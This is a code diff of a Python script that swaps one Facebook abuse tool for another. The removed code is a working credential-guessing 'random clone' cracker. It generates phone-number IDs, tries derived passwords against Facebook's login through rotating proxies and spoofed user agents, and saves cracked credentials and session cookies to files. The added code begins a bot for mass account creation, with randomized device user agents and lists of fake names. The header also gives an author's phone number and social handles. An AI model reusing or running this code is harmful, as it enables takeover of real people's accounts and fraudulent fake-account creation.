@@ -1,305 +1,622 @@
-#--------------------------(IMPORT BOX)--------------------------#
-import os,sys,time,json,random,re,string,platform,base64,uuid
-from bs4 import BeautifulSoup as sop
-from bs4 import BeautifulSoup
-import requests as ress
-from datetime import date
-from datetime import datetime
-from time import sleep
-from os import system as s
-from time import sleep as waktu
-try:
+#--> Author's Info
+Author    = 'Dapunta Khurayra X'
+Facebook  = 'Facebook.com/Dapunta.Khurayra.X'
+Instagram = 'Instagram.com/Dapunta.Ratya'
+Whatsapp  = '082245780524'
+YouTube   = 'Youtube.com/channel/UCZqnZlJ0jfoWSnXrNEj5JHA'
+
+#--> Warna
+P = "\x1b[38;5;231m" # Putih
+M = "\x1b[38;5;196m" # Merah
+H = "\x1b[38;5;46m"  # Hijau
+A = '\x1b[38;5;248m' # Abu-Abu
+
+#--> Import Module & Run
+try :
+    import os, sys, time, re, datetime, random
+    from datetime import datetime
+except Exception as e :
+    print(e)
+    exit('\nTerjadi Kesalahan!')
+try :
     import requests
-    from concurrent.futures import ThreadPoolExecutor as ThreadPool
-    import mechanize
-    from requests.exceptions import ConnectionError
-except ModuleNotFoundError:
-    os.system('pip install mechanize requests futures bs4==2 > /dev/null')
-    os.system('pip install bs4')
-    
-    
-import os
-try:
-    import requests
-except ImportError:
-    print('\n [✓] installing requests !...\n')
+except Exception as e :
     os.system('pip install requests')
-
-try:
-    import concurrent.futures
-except ImportError:
-    print('\n [✓] installing futures !...\n')
-    os.system('pip install futures')
-
-try:
+    import requests
+try :
     import bs4
-except ImportError:
-    print('\n [✓] installing bs4 !...\n')
+    from bs4 import BeautifulSoup as bs
+except Exception as e :
     os.system('pip install bs4')
-#--------------------------(COLOUR MIX)------------------------------#
+    import bs4
+    from bs4 import BeautifulSoup as bs
 
-#--------------------------(COLOUR MIX)------------------------------#
-#--------------------------(COLOUR BOX)--------------------------#    
+#--> Global Variable
+auth1 = 'Dapunta Khurayra X'
+auth2 = 'Suci Maharani Putri'
+reco = 'Gausa Direcode Bos, Tinggal Pake Aja'
+rede = 'Dibilangin Gausa Direcode'
+key = len(auth1)*len(auth2)-len(auth1)
+bulan = {'1':'Januari','2':'Februari','3':'Maret','4':'April','5':'Mei','6':'Juni','7':'Juli','8':'Agustus','9':'September','10':'Oktober','11':'November','12':'Desember'}
+ok = 0
+cp = 0
+boys_name = ['Axel Lateef Noah','Anzel Qasim Wisthara','Basheer Malik Yazdan','Bernardus Clementine Christian','Carel Vasco Zachariah','Cyrus Osmanth Elkanah','Damian Vasyl Isaac','Dominic Valdi Xander','Ephraim Benedict Gevariel','El Fatih Ghazwan','Fawwaz Rafisqy Ezaz','Faheem Fakhri Isyraq','Gianluca Nathanael Nadav','Haddad Ammar Ar-Rayyan','Istafa Tabriz Qiwam','Kenneth Krisantus Lazarus','Nathanael Alfred William','Vaskylo Yeremia Clearesta','Xaferius Eliel Antonios','Yesaya Nathanael Liam']
+girls_name = ['Atika Fithriya Tsabita','Alya Kinana Juwairiyah','Adzkiya Naila Taleetha','Adiva Arsyila Savina','Aqeela Nabiha Sakhi','Bilqis Adzkiya Rana','Chayra Ainin Qulaibah','Caliana Fiona Syafazea','Chaerunnisa Denia Athalla','Dhawiyah Nisrin Naziha','Dilara Adina Yuani','Farah Sachnaz Ashanty','Ghariyah Zharufa Abidah','Hamna Nafisa Raihana','Hanin Raihana Syahira','Izza Hilyah Nafisah','Kayla Zhara Qamela','Mahreen Shafana Almahyra','Rasahana Shafwa Ruqayah','Shakayla Aretha Shaima']
 
-RED = '\033[1;91m'
-WHITE = '\033[1;97m'
-GREEN = '\033[1;32m' #
-YELLOW = '\033[1;33m'
-BLUE = '\033[1;34m'
-ORANGE = '\033[1;35m'
-P = '\x1b[1;97m' # PUTIH
-M = '\x1b[1;91m' # MERAH
-H = '\x1b[1;92m' # HIJAU
-K = '\x1b[1;93m' # KUNING
-B = '\x1b[1;94m' # BIRU
-U = '\x1b[1;95m' # UNGU
-O = '\x1b[1;96m' # BIRU MUDA
-N = '\x1b[0m'    # WARNA MATI
-A = '\x1b[1;90m' # WARNA ABU ABU
-BN = '\x1b[1;107m' # BELAKANG PUTIH
-BBL = '\x1b[1;106m' # BELAKANG BIRU LANGIT
-BP = '\x1b[1;105m' # BELAKANG PINK
-BB = '\x1b[1;104m' # BELAKANG BIRU
-BK = '\x1b[1;103m' # BELAKANG KUNING
-BH = '\x1b[1;102m' # BELAKANG HIJAU
-BM = '\x1b[1;101m' # BELAJANG MERAH
-BA = '\x1b[1;100m' # BELAKANG ABU ABU
-now = datetime.now()
-dt_string = now.strftime("%H:%M")
-current = datetime.now()
-ta = current.year
-bu = current.month
-ha = current.day
-today = date.today() 
-#--------------------------(COUNT BOX)--------------------------#
-loop = 0
-oks = []
-cps = []
-ugen2=[]
-ugen=[]
-cokbrut=[]
-ses=requests.Session()
-princp=[]
-ugen=[]
-uas=[]
-usa = ["Mozilla/5.0 Macintosh; Intel Mac OS X 10_10_2) AppleWebKit/{str(rr(1111,9999))}.{str(rr(20,100))}.{str(rr(20,100))} (KHTML, like Gecko) Version/{str(rr(20,100))}.0.{str(rr(1111,9999))} Safari/{str(rr(1111,9999))}.{str(rr(20,100))}.{str(rr(20,100))}"]
-rr = random.randint
-#-----------------proxies
-def fetch_proxies():
+#--> Clear Terminal
+def clear():
+    if "linux" in sys.platform.lower():os.system('clear')
+    elif "win" in sys.platform.lower():os.system('cls')
+
+#--> Waktu
+def waktu():
+    _bulan_  = ["Januari", "Februari", "Maret", "April", "Mei", "Juni", "Juli", "Agustus", "September", "Oktober", "November", "Desember"][datetime.now().month - 1]
+    hari_ini = ("%s%s%s"%(datetime.now().day,_bulan_,datetime.now().year))
+    return(str(hari_ini.lower()))
+
+#--> Penjeda Waktu
+def jeda(t):
+    for x in range(t+1):
+        print('\r%sTunggu %s Detik                     '%(P,str(t)),end='');sys.stdout.flush()
+        t -= 1
+        if t == 0: break
+        else: time.sleep(1)
+def tunggu_kode(t):
+    for x in range(t+1):
+        print('\r%sTunggu Kode %s Detik                     '%(P,str(t)),end='');sys.stdout.flush()
+        t -= 1
+        if t == 0: break
+        else: time.sleep(1)
+
+#--> User Agent Vivo
+def random_ua_vivo():
+    a = random.randrange(112,115)
+    b = random.randrange(1000,10000)
+    c = random.randrange(10,100)
+    os_ver = random.randrange(10,13)                                                            #--> OS Version
+    dv_typ = random.choice(['vivo 1951','vivo 1918','V2011A','V2047','V2145','V2227A','V2160']) #--> Device Type
+    bl_typ = random.choice(['RP1A','PKQ1','QP1A','TP1A'])                                       #--> Build Type
+    dv_ver = random.randrange(100000,250000)                                                    #--> Device Version
+    sd_ver = random.randrange(1,10)                                                             #--> Update Version
+    ch_ver = f'{a}.0.{b}.{c}'                                                                   #--> Chrome Version
+    ua = f'Mozilla/5.0 (Linux; Android {os_ver}; {dv_typ} Build/{bl_typ}.{dv_ver}.00{sd_ver}; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{ch_ver} Mobile Safari/537.36'
+    return(ua)
+
+#--> User Agent Samsung
+def random_ua_samsung():
+    a = random.randrange(112,115)
+    b = random.randrange(1000,10000)
+    c = random.randrange(10,100)
+    os_ver = random.randrange(10,13)                                                            #--> OS Version
+    dv_typ = random.choice(['SM-S911B','SM-S908B','SM-G998B','SM-G988B','SM-G973B','SM-N986B']) #--> Device Type
+    bl_typ = random.choice(['PPR1','LRX21T','TP1A','RKQ1','SP1A','RP1A'])                       #--> Build Type
+    dv_ver = random.randrange(100000,250000)                                                    #--> Device Version
+    sd_ver = random.randrange(1,10)                                                             #--> Update Version
+    ch_ver = f'{a}.0.{b}.{c}'                                                                   #--> Chrome Version
+    ua = f'Mozilla/5.0 (Linux; Android {os_ver}; {dv_typ} Build/{bl_typ}.{dv_ver}.00{sd_ver}; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{ch_ver} Mobile Safari/537.36'
+    return(ua)
+
+#--> User Agent Realme
+def random_ua_realme():
+    a = random.randrange(112,115)
+    b = random.randrange(1000,10000)
+    c = random.randrange(10,100)
+    os_ver = random.randrange(10,13)                                                        #--> OS Version
+    dv_typ = random.choice(['RMX3686','RMX3393','RMX3081','RMX2170','RMX2061','RMX2020'])   #--> Device Type
+    bl_typ = random.choice(['QP1A','SKQ1','TP1A','RKQ1','SP1A','RP1A'])                     #--> Build Type
+    dv_ver = random.randrange(100000,250000)                                                #--> Device Version
+    sd_ver = random.randrange(1,10)                                                         #--> Update Version
+    ch_ver = f'{a}.0.{b}.{c}'                                                               #--> Chrome Version
+    ua = f'Mozilla/5.0 (Linux; Android {os_ver}; {dv_typ} Build/{bl_typ}.{dv_ver}.00{sd_ver}; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{ch_ver} Mobile Safari/537.36'
+    return(ua)
+
+#--> User Agent Custom
+def random_ua_custom():
     try:
-        g = requests.get('https://proxylist.geonode.com/api/proxy-list?limit=500&page=1&sort_by=lastChecked&sort_type=desc')
-        proxies_data = g.json()
-        proxies = proxies_data['data']
-        with open('proxy.txt', 'w') as file:
-            for proxy in proxies:
-                proxy_ip = proxy['ip']
-                proxy_port = proxy['port']
-                proxy_url = f"http://{proxy_ip}:{proxy_port}"
-                file.write(f"{proxy_url}\n")
-        with open('proxy.txt', 'r') as file:
-            saved_proxies = file.readlines()
-        return saved_proxies
-    except requests.exceptions.ConnectionError:
-        sys.exit(f' {R}× {W}InterNet Contention Problem.!')
+        _file_ = uman
+        if 'Android' in str(_file_):
+            ad_ver = 'Android ' + str(re.search(r'Android\s+(\d+)', _file_).group(1))
+            os_ver = 'Android ' + str(random.randrange(10,13))
+            ua1 = _file_.replace(ad_ver,os_ver)
+        else: ua1 = _file_
+        if 'Build' in str(_file_):
+            od_ver = 'Build/' + str(re.search(r'Build/([^;]+)', _file_).group(1))
+            bl_typ = random.choice(['QP1A','PPR1','TP1A','RKQ1','SP1A','RP1A','PKQ1'])
+            dv_ver = random.randrange(100000,250000)
+            sd_ver = random.randrange(1,10)
+            nw_str = 'Build/' + str('%s.%s.00%s'%(bl_typ,dv_ver,sd_ver))
+            ua2 = ua1.replace(od_ver,nw_str)
+        else: ua2 = ua1
+        if 'Chrome' in str(_file_):
+            ch_old = 'Chrome/' + str(re.search(r'Chrome/([^ ]+)', _file_).group(1))
+            a = random.randrange(112,115)
+            b = random.randrange(1000,10000)
+            c = random.randrange(10,100)
+            ch_ver = f'{a}.0.{b}.{c}'
+            ch_new = 'Chrome/' + str(ch_ver)
+            ua3 = ua2.replace(ch_old,ch_new)
+        else: ua3 = ua2
+        return(ua3)
     except Exception as e:
-        sys.exit(e)
+        return('Mozilla/5.0 (Linux; Android 11; vivo 1918 Build/RP1A.200720.012; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/112.0.0000.00 Mobile Safari/537.36')
 
-saved_proxies = fetch_proxies()
-#--------------------------(UA BOX)--------------------------#
-for sat in range(1000):
-    a='NokiaX'
-    b=random.randrange(1,9)
-    c='-0'
-    d=random.randrange(1,9)
-    e='/'
-    f=random.randrange(1,9)
-    g='.0 ('
-    h=random.randrange(1,12)
-    i='Profile/MIDP-2.1 Configuration/CLDC-1.1'
-    j='UNTRUSTED/'
-    k=random.randrange(1,3)
-    l='.0'
-    uaku2=f'{a}{b}{c}{d}{e}{f}{g}{h}{i}{j}{k}{l}'
-    ugen.append(uaku2)
-gt = random.choice(['GT-1015','GT-1020','GT-1030','GT-1035','GT-1040','GT-1045','GT-1050','GT-1240','GT-1440','GT-1450','GT-18190','GT-18262','GT-19060I','GT-19082','GT-19083','GT-19105','GT-19152','GT-19192','GT-19300','GT-19505','GT-2000','GT-20000','GT-200s','GT-3000','GT-414XOP','GT-6918','GT-7010','GT-7020','GT-7030','GT-7040','GT-7050','GT-7100','GT-7105','GT-7110','GT-7205','GT-7210','GT-7240R','GT-7245','GT-7303','GT-7310','GT-7320','GT-7325','GT-7326','GT-7340','GT-7405','GT-7550   5GT-8005','GT-8010','GT-81','GT-810','GT-8105','GT-8110','GT-8220S','GT-8410','GT-9300','GT-9320','GT-93G','GT-A7100','GT-A9500','GT-ANDROID','GT-B2710','GT-B5330','GT-B5330B','GT-B5330L','GT-B5330ZKAINU','GT-B5510','GT-B5512','GT-B5722','GT-B7510','GT-B7722','GT-B7810','GT-B9150','GT-B9388','GT-C3010','GT-C3262','GT-C3310R','GT-C3312','GT-C3312R','GT-C3313T','GT-C3322','GT-C3322i','GT-C3520','GT-C3520I','GT-C3592','GT-C3595','GT-C3782','GT-C6712','GT-E1282T','GT-E1500','GT-E2200','GT-E2202','GT-E2250','GT-E2252','GT-E2600','GT-E2652W','GT-E3210','GT-E3309','GT-E3309I','GT-E3309T','GT-G530H','GT-g900f','GT-G930F','GT-H9500','GT-I5508','GT-I5801','GT-I6410','GT-I8150','GT-I8160OKLTPA','GT-I8160ZWLTTT','GT-I8258','GT-I8262D','GT-I8268','GT-I8505','GT-I8530BAABTU','GT-I8530BALCHO','GT-I8530BALTTT','GT-I8550E','GT-i8700','GT-I8750','GT-I900','GT-I9008L','GT-i9040','GT-I9080E','GT-I9082C','GT-I9082EWAINU','GT-I9082i','GT-I9100G','GT-I9100LKLCHT','GT-I9100M','GT-I9100P','GT-I9100T','GT-I9105UANDBT','GT-I9128E','GT-I9128I','GT-I9128V','GT-I9158P','GT-I9158V','GT-I9168I','GT-I9192I','GT-I9195H','GT-I9195L','GT-I9250','GT-I9303I','GT-I9305N','GT-I9308I','GT-I9505G','GT-I9505X','GT-I9507V','GT-I9600','GT-m190','GT-M5650','GT-mini','GT-N5000S','GT-N5100','GT-N5105','GT-N5110','GT-N5120','GT-N7000B','GT-N7005','GT-N7100T','GT-N7102','GT-N7105','GT-N7105T','GT-N7108','GT-N7108D','GT-N8000','GT-N8005','GT-N8010','GT-N8020','GT-N9000','GT-N9505','GT-P1000CWAXSA','GT-P1000M','GT-P1000T','GT-P1010','GT-P3100B','GT-P3105','GT-P3108','GT-P3110','GT-P5100','GT-P5200','GT-P5210XD1','GT-P5220','GT-P6200','GT-P6200L','GT-P6201','GT-P6210','GT-P6211','GT-P6800','GT-P7100','GT-P7300','GT-P7300B','GT-P7310','GT-P7320','GT-P7500D','GT-P7500M','GT-P7500R','GT-P7500V','GT-P7501','GT-P7511','GT-S3330','GT-S3332','GT-S3333','GT-S3370','GT-S3518','GT-S3570','GT-S3600i','GT-S3650','GT-S3653W','GT-S3770K','GT-S3770M','GT-S3800W','GT-S3802','GT-S3850','GT-S5220','GT-S5220R','GT-S5222','GT-S5230','GT-S5230W','GT-S5233T','GT-s5233w','GT-S5250','GT-S5253','GT-s5260','GT-S5280','GT-S5282','GT-S5283B','GT-S5292','GT-S5300','GT-S5300L','GT-S5301','GT-S5301B','GT-S5301L','GT-S5302','GT-S5302B','GT-S5303','GT-S5303B','GT-S5310','GT-S5310B','GT-S5310C','GT-S5310E','GT-S5310G','GT-S5310I','GT-S5310L','GT-S5310M','GT-S5310N','GT-S5312','GT-S5312B','GT-S5312C','GT-S5312L','GT-S5330','GT-S5360','GT-S5360B','GT-S5360L','GT-S5360T','GT-S5363','GT-S5367','GT-S5369','GT-S5380','GT-S5380D','GT-S5500','GT-S5560','GT-S5560i','GT-S5570B','GT-S5570I','GT-S5570L','GT-S5578','GT-S5600','GT-S5603','GT-S5610','GT-S5610K','GT-S5611','GT-S5620','GT-S5670','GT-S5670B','GT-S5670HKBZTA','GT-S5690','GT-S5690R','GT-S5830','GT-S5830D','GT-S5830G','GT-S5830i','GT-S5830L','GT-S5830M','GT-S5830T','GT-S5830V','GT-S5831i','GT-S5838','GT-S5839i','GT-S6010','GT-S6010BBABTU','GT-S6012','GT-S6012B','GT-S6102','GT-S6102B','GT-S6293T','GT-S6310B','GT-S6310ZWAMID','GT-S6312','GT-S6313T','GT-S6352','GT-S6500','GT-S6500D','GT-S6500L','GT-S6790','GT-S6790L','GT-S6790N','GT-S6792L','GT-S6800','GT-S6800HKAXFA','GT-S6802','GT-S6810','GT-S6810B','GT-S6810E','GT-S6810L','GT-S6810M','GT-S6810MBASER','GT-S6810P','GT-S6812','GT-S6812B','GT-S6812C','GT-S6812i','GT-S6818','GT-S6818V','GT-S7230E','GT-S7233E','GT-S7250D','GT-S7262','GT-S7270','GT-S7270L','GT-S7272','GT-S7272C','GT-S7273T','GT-S7278','GT-S7278U','GT-S7390','GT-S7390G','GT-S7390L','GT-S7392','GT-S7392L','GT-S7500','GT-S7500ABABTU','GT-S7500ABADBT','GT-S7500ABTTLP','GT-S7500CWADBT','GT-S7500L','GT-S7500T','GT-S7560','GT-S7560M','GT-S7562','GT-S7562C','GT-S7562i','GT-S7562L','GT-S7566','GT-S7568','GT-S7568I','GT-S7572','GT-S7580E','GT-S7583T','GT-S758X','GT-S7592','GT-S7710','GT-S7710L','GT-S7898','GT-S7898I','GT-S8500','GT-S8530','GT-S8600','GT-STB919','GT-T140','GT-T150','GT-V8a','GT-V8i','GT-VC818','GT-VM919S','GT-W131','GT-W153','GT-X831','GT-X853','GT-X870','GT-X890','GT-Y8750'])
-for xd in range(10000):
-        aa='Mozilla/5.0 (Linux; U; Android'
-        b=random.choice(['6','7','8','9','10','11','12','13'])
-        c=f' TL-tl; {str(gt)}'
-        g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
-        h=random.randrange(73,100)
-        i='0'
-        j=random.randrange(4200,4900)
-        k=random.randrange(40,150)
-        l='Mobile Safari/537.36'
-        uaku2=f'{aa} {b}; {c}) {g}{h}.{i}.{j}.{k} {l}'
-        ugen.append(uaku2)
-for txxxtt in range (1000):
-	a='Mozilla/5.0 (Linux; Android'
-	b=random.choice(['9','10','11','12','13','14','15'])
-	c='Redmi Note 8 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
-	d=random.randrange(40,115)
-	e='0'
-	f=random.randrange(3000,6000)
-	g=random.randrange(20,100)
-	h='Mobile Safari/537.36'
-	ffg=f'{a} {b}; {c}{d}.{e}.{f}.{g} {h}'
-	ugen.append(ffg)
-#--------------------------(LOGO BOX)--------------------------#
-logo =("""     
-
- \033[1;91m<═══\033[1;41m\033[1;97m TOOLS BY USE ONLY NIGERIANS PAID USER \033[;0m\033[1;91m═══>\033[1;92m                              
-\x1b[38;5;46m⋆\x1b[38;5;254m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\x1b[38;5;50m⋆
-\033[1;31m[\033[1;32m=\033[1;31m]\x1b[38;5;46mTOOLS MAKE\033[1;31m● \x1b[38;5;46mSUMON ROY
-\033[1;31m[\033[1;32m=\033[1;31m]\x1b[38;5;46mVERSION  \033[1;31m ● \x1b[38;5;46mPREMIUM
-\x1b[38;5;50m⋆\x1b[38;5;254m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\x1b[38;5;50m⋆""")
-
-linex=('\x1b[38;5;46m⋆\x1b[38;5;254m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\x1b[38;5;50m⋆')   
-#--------------------------(MENU BOX)--------------------------#
-class Main:
-    def __init__(self):
-        self.id = []
-        self.ok = []
-        self.cp = []
-        self.loop = 0
-        os.system("clear")
-        print(logo)
-    #    os.system('xdg-open fb://group/1885398221816745?ref=share&mibextid=NSMWBT')
-        print('\033[1;31m[\033[1;32m1\033[1;31m]\x1b[38;5;46m START RANDOM CLONE')
-        print('\033[1;31m[\033[1;32m2\033[1;31m]\x1b[38;5;46m EXIT')
-        print('\x1b[38;5;46m⋆\x1b[38;5;254m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\x1b[38;5;50m⋆')
-        Shorif =input("\033[1;32m[\033[1;32m?\033[1;32m] CHOOSE : ")
-        if Shorif in ["1", "01"]:
-            v2()
-        else:
-            exit()
-#--------------------------(COLOUR BOX)--------------------------#
-
-A = '\x1b[1;97m' 
-B = '\x1b[1;96m' 
-C = '\x1b[1;91m' 
-D = '\033[38;5;46m'
-M = '\033[1;31m'
-H = '\033[38;5;46m'
-N = '\x1b[1;37m'    
-E = '\x1b[1;93m' 
-F = '\x1b[1;94m'
-G = '\x1b[1;95m'
-P = '\033[1;37m'
-#--------------------------(CLONING MENU BOX)--------------------------#
-def v2():
-    user=[]
-    os.system('clear')
-    print(logo)
-    print('[+] ENTER YOUR CODE  => 767 789 679')
-    kode = input('\033[1;32m[\033[1;32m?\033[1;32m] SIM CODE : ')
-    kodex = ''.join(random.choice(string.digits) for _ in range(2))
-    kod = ''.join(random.choice(string.digits) for _ in range(2))
-    print('[+] 2000. 5000. 10000. 15000. 50000')
-    limit = int(input('[?] ENTER YOUR CRACK LIMIT : '))
-    for nmbr in range(limit):
-        nmp = ''.join(random.choice(string.digits) for _ in range(3))
-        user.append(nmp)
-    with ThreadPool(max_workers=60) as akash:
-        os.system('clear')
-        print(logo)
-        tl = str(len(user))
-        print('\033[1;31m[\033[1;32m=\033[1;31m]\x1b[38;5;46m SIM CODE : '+kode)
-        print('\033[1;31m[\033[1;32m=\033[1;31m]\x1b[38;5;46m CRACK ID : '+tl)
-        print('\x1b[38;5;46m⋆\x1b[38;5;254m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\x1b[38;5;50m⋆')
-        for guru in user:
-            uid = kode+kodex+kod+guru
-            pwx = [uid[:6],uid[:8],uid]
-            akash.submit(rcrack1,uid,pwx,tl)
-    print(linex)
-    print('\033[1;37m[\033[1;32m~\033[1;37m] CRACK SUCCESSFULLY COMPLETED..')
-    print(linex)
-#--------------------------(MATHOD BOX)--------------------------#
-def rcrack1(uid,pwx,tl):
-    global loop
-    global cps
-    global oks
-    global proxy
+#--> Convert Cookies
+def cvt(st,ran):
     try:
-        for ps in pwx:
-            pro = random.choice(ugen)
-            proxy_u = random.choice(saved_proxies).strip()
-            proxies = {'http':f'{proxy_u}'}
-            session = requests.Session()
-            bi = random.choice([A,B,C,D,E,F,G,H])
-            sys.stdout.write(f'\r \033[1;31m[%sLONDLY-XD\033[1;31m]\033[1;34m\033[1;31m[\033[38;5;195m%s/%s\033[1;31m]\033[1;34m\033[38;5;45mOK-\033[38;5;46m%s\r'%(bi,loop,tl,len(oks))),
-            sys.stdout.flush()
-            free_fb = session.get('https://free.facebook.com').text
-            log_data = {
-            "lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
-            "jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
-            "m_ts":re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
-            "li":re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
-            "try_number":"0",
-            "unrecognized_tries":"0",
-            "email":uid,
-            "pass":ps,
-            "login":"Log In"}
-            cookies = {
-            'sb': 'VKa9ZkevIqGKH5mmTljYdUro',
-            'datr': 'VKa9Zn2S1Z_ptvbMV96KkeAx',
-            'ps_l': '1',
-            'ps_n': '1',
-            'wd': '1440x773',
-            'fr': '1TtcqI6vgDuofxZxz.AWWD56RW899jg7K7FR5hmWOBrVY.BmvaYd..AAA.0.0.BmxLRn.AWVUkN1IrZw',}
-            header_freefb = {'authority': 'm.facebook.com',
-            'method': 'GET',
-            'scheme': 'https',
-            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
-            'accept-language': 'en-IN,en-US;q=0.9,en-GB;q=0.8,en;q=0.7,hi;q=0.6,gu;q=0.5',
-            'cache-control': 'max-age=0',
-            'content-type': 'application/x-www-form-urlencoded',
-            # 'cookie': 'sb=VKa9ZkevIqGKH5mmTljYdUro; datr=VKa9Zn2S1Z_ptvbMV96KkeAx; ps_l=1; ps_n=1; wd=1440x773; fr=1TtcqI6vgDuofxZxz.AWWD56RW899jg7K7FR5hmWOBrVY.BmvaYd..AAA.0.0.BmxLRn.AWVUkN1IrZw',
-            'dpr': '1',
-            'origin': 'https://mbasic.alpha.facebook.com',
-            'priority': 'u=0, i',
-            'referer': 'https://mbasic.alpha.facebook.com/?',
-            'sec-ch-prefers-color-scheme': 'dark',
-            'sec-ch-ua-full-version-list': '"Not)A;Brand";v="99.0.0.0", "Google Chrome";v="127.0.6533.120", "Chromium";v="127.0.6533.120"','sec-ch-ua': '"Not)A;Brand";v="99", "Google Chrome";v="127", "Chromium";v="127"',
-            'sec-ch-ua-full-version-list': '"Not)A;Brand";v="99.0.0.0", "Google Chrome";v="127.0.6533.120", "Chromium";v="127.0.6533.120"','sec-ch-ua-full-version-list': '"Not)A;Brand";v="99.0.0.0", "Google Chrome";v="127.0.6533.120", "Chromium";v="127.0.6533.120"',
-            'sec-ch-ua-full-version-list': '"Not)A;Brand";v="99.0.0.0", "Google Chrome";v="127.0.6533.120", "Chromium";v="127.0.6533.120"','sec-ch-ua-mobile': '?0',
-            'sec-ch-ua-full-version-list': '"Not)A;Brand";v="99.0.0.0", "Google Chrome";v="127.0.6533.120", "Chromium";v="127.0.6533.120"','sec-ch-ua-model': '""',
-            'sec-ch-ua-full-version-list': '"Not)A;Brand";v="99.0.0.0", "Google Chrome";v="127.0.6533.120", "Chromium";v="127.0.6533.120"','sec-ch-ua-platform': '"Windows"',
-            'sec-ch-ua-full-version-list': '"Not)A;Brand";v="99.0.0.0", "Google Chrome";v="127.0.6533.120", "Chromium";v="127.0.6533.120"','sec-ch-ua-platform-version': '"10.0.0"',
-            'sec-ch-ua-full-version-list': '"Not)A;Brand";v="99.0.0.0", "Google Chrome";v="127.0.6533.120", "Chromium";v="127.0.6533.120"','sec-fetch-dest': 'document',
-            'sec-ch-ua-full-version-list': '"Not)A;Brand";v="99.0.0.0", "Google Chrome";v="127.0.6533.120", "Chromium";v="127.0.6533.120"','sec-fetch-mode': 'navigate',
-            'sec-ch-ua-full-version-list': '"Not)A;Brand";v="99.0.0.0", "Google Chrome";v="127.0.6533.120", "Chromium";v="127.0.6533.120"','sec-fetch-site': 'same-origin',
-            'sec-ch-ua-full-version-list': '"Not)A;Brand";v="99.0.0.0", "Google Chrome";v="127.0.6533.120", "Chromium";v="127.0.6533.120"','sec-fetch-user': '?1',
-            'sec-ch-ua-full-version-list': '"Not)A;Brand";v="99.0.0.0", "Google Chrome";v="127.0.6533.120", "Chromium";v="127.0.6533.120"','upgrade-insecure-requests': '1',
-            'sec-ch-ua-full-version-list': '"Not)A;Brand";v="99.0.0.0", "Google Chrome";v="127.0.6533.120", "Chromium";v="127.0.6533.120"','user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36',
-            'sec-ch-ua-full-version-list': '"Not)A;Brand";v="99.0.0.0", "Google Chrome";v="127.0.6533.120", "Chromium";v="127.0.6533.120"','viewport-width': '885',}
-            response = session.post('https://mbaasic.alpha.facebook.com/login/device-based/regular/login/?refsrc=deprecated&lwv=100&refid=8',cookies = cookies,data = log_data,headers = header_freefb,proxies = proxies)
-            if response.status_code == 200:
-              #print(f"\r\033[1;91m [succes] - Status code {response.status_code}")
-              #print(f"\x1b[38;5;196m[proxies💔] {proxies}")
-              log_cookies=session.cookies.get_dict().keys()
-              if 'c_user' in log_cookies:
-                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
-                bo = random.choice([RED,GREEN,BLUE,YELLOW,ORANGE,])
-                cid = coki[65:80]
-                print('\r\r\033[1;32m[LONDLY-OK💚] ' +uid+ ' | ' +ps+    '  \n[‎‎🌺]\x1b[38;5;254mCOOKIE = \x1b[38;5;254m'+coki+ ' ''  \x1b[38;5;254m')
-                open('/sdcard/LONDLY-OK.txt', 'a').write(cid+' | '+ps+' | '+coki+'\n')
-                oks.append(uid)
-                break
-              elif 'checkpoint' in log_cookies:
-                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
-                cid = coki[82:97]
-                print(f"\x1b[38;5;196m[ARAFAT-CP💔] {uid}|{ps}")
-                open('/sdcard/ARAFAT-CP.txt', 'a').write( uid+' | '+ps+' \n')
-                cps.append(uid)
-                break
-            else:
-                print(f"\r\033[1;91m [ERROR] - Status code {response.status_code}")
-                continue
-        loop+=1
-        
-    except:
-        pass
+        if st == 'ok': cookie = ('sb=%s;datr=%s;c_user=%s;xs=%s;fr=%s;'%(ran['sb'],ran['datr'],ran['c_user'],ran['xs'],ran['fr']))
+        elif st == 'cp': cookie = ('checkpoint=%s;datr=%s;fr=%s;'%(ran['checkpoint'],ran['datr'],ran['fr']))
+    except Exception as e : cookie = '; '.join([str(x)+"="+str(y) for x,y in ran])
+    return(str(cookie))
 
+#--> Logo
+def logo():
+    print('%s_________                      __        %s________________ %s'%(P,M,P))
+    print('%s\_   ___ \_______ ____ _____ _/  |_  ____%s\_   ____|___   \\%s'%(P,M,P))
+    print('%s/    \  \/\_  __ \ __ \\\\__  \\\\   __\/ __ \%s|    __)   |  _/%s'%(P,M,P))
+    print('%s\ %s0.1 %s\____|  | \/ ___/ / __ \|  | \  ___/%s|   \  |   |   \\%s'%(P,M,P,M,P))
+    print('%s \________/|__|  \_____>______/__|  \____>%s|___/  |_______/%s'%(P,M,P))
+    print('%s\n      ─────────────── %s• %sRan_Arraya %s• %s───────────────\n%s'%(A,M,P,M,A,P))
+
+#--> Main Menu
+class menu:
+    def __init__(self):
+        logo()
+        self.main_menu()
+    def main_menu(self):
+        print('%s[%s1%s] %sCreate Account'%(M,P,M,P))
+        print('%s[%s2%s] %sCheck Result'%(M,P,M,P))
+        print('%s[%s3%s] %sSettings'%(M,P,M,P))
+        print('%s[%s4%s] %sBot'%(M,P,M,P))
